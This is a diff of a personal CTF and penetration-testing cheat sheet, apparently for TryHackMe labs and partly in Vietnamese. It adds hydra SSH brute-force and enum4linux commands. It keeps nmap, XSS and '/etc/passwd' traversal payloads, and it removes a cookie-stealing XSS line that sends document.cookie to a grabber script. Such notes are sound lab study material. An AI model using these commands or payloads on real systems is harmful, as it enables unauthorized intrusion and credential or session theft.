@@ -4,9 +4,9 @@
 
 =======================================
 
-[+] RUN_WEB:
-	- sudo service nginx start
-	- /var/www/html/
+[+] Tools:
+	- enum4linux -a <MACHINE IP>: kiếm username
+	- hydra -t 4 -l <username> -P <rockyou.txt directory> ssh://<MACHINE IP>: Kiếm password
 
 =======================================
 
@@ -16,6 +16,7 @@
 
 [+] OSINT: 
 	- nmap -T4 -sC -sV -p[start]-[stop] [ip]
+	
 	- site		site:tryhackme.com	returns results only from the specified website address
 	- inurl		inurl:admin		returns results that have the specified word in the URL
 	- filetype	filetype:pdf		returns results which are a particular file extension
@@ -83,7 +84,7 @@
 	- innerHTML: Chèn giá trị trực tiếp vào code web
 	- h2:contains(): có thể inject xss
 	- javascript:alert(1) -> xss link
-	- <script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+	- 	
 
 =======================================
 
@@ -136,7 +137,7 @@
 	- ../../../etc/passwd%00.png
 	
 [+] RFI:
-	-
+	- Sử dụng link raw github (https://www.4rth4s.xyz/2019/09/write-up-remote-file-inclusion-root-me.html)
 
 =======================================
 
